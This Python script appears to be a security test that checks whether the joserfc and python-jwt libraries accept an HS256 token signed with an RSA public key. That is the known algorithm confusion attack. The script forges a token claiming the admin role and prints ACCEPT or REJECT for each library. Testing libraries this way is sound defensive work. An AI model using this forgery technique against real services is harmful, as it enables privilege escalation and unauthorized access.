"""Cross-language (Python extra libs) — python-jwt & joserfc algorithm confusion."""
import json, hmac, hashlib, base64, warnings
warnings.filterwarnings("ignore")
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

priv = rsa.generate_private_key(65537, 2048)
pub_pem = priv.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)


def b64(x): return base64.urlsafe_b64encode(x).decode().rstrip("=")


h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64(json.dumps({"role": "admin", "iss": "real-issuer"}).encode())
sig = b64(hmac.new(pub_pem, f"{h}.{p}".encode(), hashlib.sha256).digest())
forged = f"{h}.{p}.{sig}"

print("=" * 70)
print("Python extra libs — algorithm confusion (RS256->HS256)")
print("=" * 70)

# joserfc
try:
    from joserfc import jwt as jrfc
    from joserfc.jwk import RSAKey
    from importlib.metadata import version
    v = version("joserfc")
    tp = 0
    try:
        jrfc.decode(forged, RSAKey.import_key(pub_pem), algorithms=["RS256", "HS256"])
        tp = 1
        print(f"  [A]  joserfc {v} algorithms=[RS256,HS256]  ACCEPT")
    except Exception as e:
        print(f"  [OK] joserfc {v} algorithms=[RS256,HS256]  REJECT {type(e).__name__}")
    print(f"RESULT\tjoserfc {v}\tconfusion_TP={tp}")
except Exception as e:
    print("  joserfc unavailable:", e)

# python-jwt (GehirnInc) — uses jwcrypto under the hood
try:
    import python_jwt as pyjwt2
    from importlib.metadata import version
    v = version("python-jwt")
    tp = 0
    try:
        pyjwt2.verify_jwt(forged, pub_pem.decode(), allowed_algs=["RS256", "HS256"])
        tp = 1
        print(f"  [A]  python-jwt {v} allowed=[RS256,HS256]  ACCEPT")
    except Exception as e:
        print(f"  [OK] python-jwt {v} allowed=[RS256,HS256]  REJECT {type(e).__name__}")
    print(f"RESULT\tpython-jwt {v}\tconfusion_TP={tp}")
except Exception as e:
    print("  python-jwt unavailable:", e)
